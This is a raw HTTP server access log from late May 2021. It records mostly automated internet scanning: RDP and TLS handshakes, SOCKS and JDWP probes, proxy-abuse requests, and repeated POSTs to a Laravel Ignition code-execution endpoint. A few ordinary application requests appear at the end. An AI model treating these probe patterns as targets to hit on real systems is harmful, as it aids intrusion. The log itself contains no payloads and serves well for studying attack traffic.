45.155.205.209 - - [26/May/2021 13:45:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 13:45:22] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [26/May/2021 14:29:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [26/May/2021 14:29:25] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [26/May/2021 14:44:17] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 14:44:17] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
50.31.21.11 - - [26/May/2021 14:52:50] "[33mGET / HTTP/1.0[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:48] "[33mPOST /sdk HTTP/1.1[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:48] "[33mGET /nmaplowercheck1622012087 HTTP/1.1[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:48] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:48] "[33mGET / HTTP/1.0[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:49] "[33mGET / HTTP/1.1[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:51] "[33mGET /evox/about HTTP/1.1[0m" 404 -
50.31.21.11 - - [26/May/2021 14:54:53] "[33mGET / HTTP/1.1[0m" 404 -
185.202.2.149 - - [26/May/2021 15:19:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [26/May/2021 15:19:09] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
192.241.212.100 - - [26/May/2021 15:49:28] code 400, message Bad request syntax ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03Ü\x8ap\x8c\x1dÄå³³\x07Þ\xa0\x92Û\x0enC_\x0b\x9f\x90\x86îÏ í÷ùÄ±\x82m\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
192.241.212.100 - - [26/May/2021 15:49:28] "[35m[1m   ÜpÄå³³Þ ÛnC_îÏ í÷ùÄ±m  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
118.126.124.198 - - [26/May/2021 16:54:44] "[33mGET / HTTP/1.1[0m" 404 -
104.206.128.34 - - [26/May/2021 17:08:34] "[33mGET / HTTP/1.1[0m" 404 -
193.106.29.74 - - [26/May/2021 17:29:50] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [26/May/2021 17:29:50] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [26/May/2021 19:09:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 19:09:01] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [26/May/2021 23:37:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [26/May/2021 23:37:24] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [27/May/2021 04:25:55] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [27/May/2021 04:25:55] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
123.245.24.24 - - [27/May/2021 04:25:59] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
123.245.24.24 - - [27/May/2021 04:25:59] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [27/May/2021 04:26:37] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [27/May/2021 04:27:03] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [27/May/2021 04:27:03] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
27.115.124.75 - - [27/May/2021 05:51:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x90L\x10G\x9c¼fEF\x992\x13¢«\x9eÓ¸WYð\x8e\x03Þ²\x06ùGBßù\x15|\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
27.115.124.75 - - [27/May/2021 05:51:32] "[35m[1m u  qLG¼fEF2¢«Ó¸WYðÞ²ùGBßù|  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
27.115.124.37 - - [27/May/2021 05:51:42] "[33mGET / HTTP/1.0[0m" 404 -
27.115.124.99 - - [27/May/2021 05:51:43] "[33mGET / HTTP/1.1[0m" 404 -
27.115.124.9 - - [27/May/2021 05:51:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
27.115.124.100 - - [27/May/2021 05:51:43] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
27.115.124.9 - - [27/May/2021 05:51:43] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
200.150.201.32 - - [27/May/2021 07:20:33] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
162.142.125.38 - - [27/May/2021 08:21:12] "[33mGET / HTTP/1.1[0m" 404 -
89.248.164.165 - - [27/May/2021 08:25:36] "[33mGET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1[0m" 404 -
205.185.117.39 - - [27/May/2021 08:27:15] "[33mGET / HTTP/1.1[0m" 404 -
3.89.210.27 - - [27/May/2021 10:03:55] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [27/May/2021 11:20:36] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [27/May/2021 11:20:36] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [27/May/2021 11:30:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [27/May/2021 11:30:49] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [27/May/2021 12:58:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [27/May/2021 12:58:40] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [27/May/2021 17:51:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [27/May/2021 17:51:13] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
122.228.19.80 - - [27/May/2021 18:18:37] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x80\x0b¨À\x00\x0c)t F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
122.228.19.80 - - [27/May/2021 18:18:37] "[35m[1m   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [27/May/2021 18:40:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [27/May/2021 18:40:49] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.56 - - [27/May/2021 19:42:51] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.56 - - [27/May/2021 19:42:51] "[33mGET / HTTP/1.1[0m" 404 -
184.105.247.196 - - [27/May/2021 22:50:01] "[33mGET / HTTP/1.1[0m" 404 -
106.75.211.111 - - [27/May/2021 23:26:59] "[33mGET http://www.qq.com/404/search_children.js HTTP/1.1[0m" 404 -
106.75.211.111 - - [27/May/2021 23:27:09] code 400, message Bad request syntax ('\x05\x01\x00')
106.75.211.111 - - [27/May/2021 23:27:09] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
106.75.211.111 - - [27/May/2021 23:27:09] code 400, message Bad request syntax ('\x04\x01\x00PpTi4\x00')
106.75.211.111 - - [27/May/2021 23:27:09] "[35m[1m PpTi4 [0m" HTTPStatus.BAD_REQUEST -
118.126.124.141 - - [28/May/2021 02:57:56] "[33mGET / HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:32] "[33mHEAD / HTTP/1.0[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:33] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:34] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:34] "[33mGET /c/version.js HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:35] "[33mGET /streaming/clients_live.php HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:36] "[33mGET /stalker_portal/c/version.js HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:37] "[33mGET /client_area/ HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:38] "[33mGET /stalker_portal/c/ HTTP/1.1[0m" 404 -
165.232.154.8 - - [28/May/2021 04:26:39] "[33mGET /stream/live.php HTTP/1.1[0m" 404 -
161.189.192.94 - - [28/May/2021 06:30:03] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
161.189.192.94 - - [28/May/2021 06:30:03] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [28/May/2021 06:34:02] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [28/May/2021 06:34:02] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [28/May/2021 06:35:55] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [28/May/2021 06:35:55] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [28/May/2021 06:45:51] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.134.11 - - [28/May/2021 06:45:51] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [28/May/2021 06:47:26] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
161.189.192.94 - - [28/May/2021 06:47:26] "[35m[1m~   ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [28/May/2021 06:51:11] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.192.94 - - [28/May/2021 06:51:11] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [28/May/2021 06:58:07] code 400, message Bad HTTP/0.9 request type ('\x02¤Uÿ\x00\x00\x00')
161.189.134.11 - - [28/May/2021 06:58:07] "[35m[1m¤Uÿ   [0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [28/May/2021 07:00:56] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
161.189.134.11 - - [28/May/2021 07:00:56] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [28/May/2021 07:06:14] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [28/May/2021 07:06:14] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
184.105.139.70 - - [28/May/2021 08:04:36] "[33mGET / HTTP/1.1[0m" 404 -
88.5.238.31 - - [28/May/2021 10:39:52] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [28/May/2021 11:26:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [28/May/2021 11:26:01] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
192.241.202.93 - - [28/May/2021 12:35:11] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [28/May/2021 13:30:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [28/May/2021 13:30:46] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [28/May/2021 14:40:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [28/May/2021 14:40:38] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [28/May/2021 16:19:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [28/May/2021 16:19:25] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
54.177.116.229 - - [28/May/2021 19:00:27] "[33mGET / HTTP/1.1[0m" 404 -
193.106.29.74 - - [28/May/2021 19:17:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [28/May/2021 19:17:05] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
103.214.170.101 - - [28/May/2021 21:15:33] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
103.214.170.101 - - [28/May/2021 21:15:33] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
121.196.169.191 - - [28/May/2021 23:19:26] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
95.153.119.226 - - [29/May/2021 00:13:22] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:22] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      bbXcsXctst      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:27] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:27] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      tsXrcsXYs9      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:33] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ctXsbtsbXb\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:33] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      ctXsbtsbXb      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:38] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00btXcccbtXY\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:38] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      btXcccbtXY      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:43] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bXYXs9rtrs\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:43] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      bXYXs9rtrs      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:49] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00tYYYrcXtcr\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:49] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      tYYYrcXtcr      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:54] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00cttttrrtXt\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:54] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      cttttrrtXt      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:13:59] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bssbctsrbt\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:13:59] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      bssbctsrbt      [0m" HTTPStatus.BAD_REQUEST -
95.153.119.226 - - [29/May/2021 00:14:05] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x010I\x00\x00\x00\x00\x8cd¨À\x00\x00\x00\x00\x00\x00\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bcc9rt9cYt\x00\x00\x00\x00\x00\x00')
95.153.119.226 - - [29/May/2021 00:14:05] "[35m[1m   TZ          0I    d¨À       tsXrcsXYs9                      bcc9rt9cYt      [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [29/May/2021 00:38:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [29/May/2021 00:38:16] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
195.54.167.183 - - [29/May/2021 01:30:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
195.54.167.183 - - [29/May/2021 01:30:24] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [29/May/2021 03:40:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [29/May/2021 03:40:09] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [29/May/2021 03:49:21] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [29/May/2021 03:49:22] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [29/May/2021 03:49:22] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
162.142.125.55 - - [29/May/2021 07:40:43] "[33mGET / HTTP/1.1[0m" 404 -
47.241.193.60 - - [29/May/2021 10:32:40] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [29/May/2021 10:33:09] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [29/May/2021 10:33:09] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [29/May/2021 10:33:22] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [29/May/2021 10:33:22] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [29/May/2021 12:25:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [29/May/2021 12:25:52] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [29/May/2021 13:29:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [29/May/2021 13:29:08] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [29/May/2021 14:15:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [29/May/2021 14:15:25] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
64.62.197.2 - - [29/May/2021 14:29:28] "[33mGET / HTTP/1.1[0m" 404 -
89.248.164.165 - - [29/May/2021 16:48:11] "[33mGET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1[0m" 404 -
185.167.97.191 - - [29/May/2021 16:56:37] code 400, message Bad request version ('À\x14À')
185.167.97.191 - - [29/May/2021 16:56:37] "[35m[1m {  w36²Q¤j¯°¡ºb^èMÌ%¼^zwN  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
185.202.2.149 - - [29/May/2021 18:09:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.202.2.149 - - [29/May/2021 18:09:27] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
8.133.179.231 - - [29/May/2021 18:30:50] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
152.136.198.226 - - [29/May/2021 20:03:38] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
74.120.14.37 - - [29/May/2021 20:11:03] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.37 - - [29/May/2021 20:11:03] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.141 - - [29/May/2021 20:24:31] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.56 - - [29/May/2021 21:08:15] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.56 - - [29/May/2021 21:08:16] "[33mGET / HTTP/1.1[0m" 404 -
104.206.128.22 - - [29/May/2021 21:27:52] "[33mGET / HTTP/1.1[0m" 404 -
185.20.226.243 - - [29/May/2021 23:26:26] "[33mGET / HTTP/1.0[0m" 404 -
47.241.193.60 - - [30/May/2021 01:46:03] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [30/May/2021 01:46:03] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [30/May/2021 01:46:22] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 01:46:45] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [30/May/2021 01:46:45] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
154.197.27.231 - - [30/May/2021 05:07:35] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 08:15:06] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [30/May/2021 08:15:43] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [30/May/2021 08:15:43] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
223.166.74.231 - - [30/May/2021 08:15:47] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
223.166.74.231 - - [30/May/2021 08:15:47] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [30/May/2021 08:15:58] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [30/May/2021 08:15:58] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
172.81.129.98 - - [30/May/2021 10:29:54] code 400, message Bad request syntax ('JDWP-Handshake\\0\\0\\0\\11\\0\\0\\0\\1\\0\\1\\1')
172.81.129.98 - - [30/May/2021 10:29:54] "[35m[1mJDWP-Handshake\0\0\0\11\0\0\0\1\0\1\1[0m" HTTPStatus.BAD_REQUEST -
104.219.232.118 - - [30/May/2021 10:29:54] code 400, message Bad request syntax ('JDWP-Handshake\\0\\0\\0\\11\\0\\0\\0\\1\\0\\1\\1')
104.219.232.118 - - [30/May/2021 10:29:54] "[35m[1mJDWP-Handshake\0\0\0\11\0\0\0\1\0\1\1[0m" HTTPStatus.BAD_REQUEST -
203.159.80.75 - - [30/May/2021 10:40:36] code 400, message Bad HTTP/0.9 request type ('Z¥\x01')
203.159.80.75 - - [30/May/2021 10:40:36] "[35m[1mZ¥     [0m" HTTPStatus.BAD_REQUEST -
89.248.164.165 - - [30/May/2021 11:35:51] "[33mGET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1[0m" 404 -
60.191.125.35 - - [30/May/2021 11:43:28] "[33mHEAD http://112.124.42.80:63435/ HTTP/1.1[0m" 404 -
119.3.154.26 - - [30/May/2021 12:44:30] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
218.197.97.60 - - [30/May/2021 14:42:06] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:06] "[37mPOST /login HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:16] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:19] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:19] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:52] "[37mOPTIONS /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
218.197.97.60 - - [30/May/2021 14:42:53] "[37mGET /statistics/p-value?Algorithm=DES&Mode=ECB HTTP/1.1[0m" 200 -
180.149.125.175 - - [30/May/2021 14:54:24] "[33mGET /c/ HTTP/1.1[0m" 404 -
45.55.83.48 - - [30/May/2021 20:43:12] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
180.149.125.175 - - [31/May/2021 01:03:13] "[33mGET / HTTP/1.1[0m" 404 -
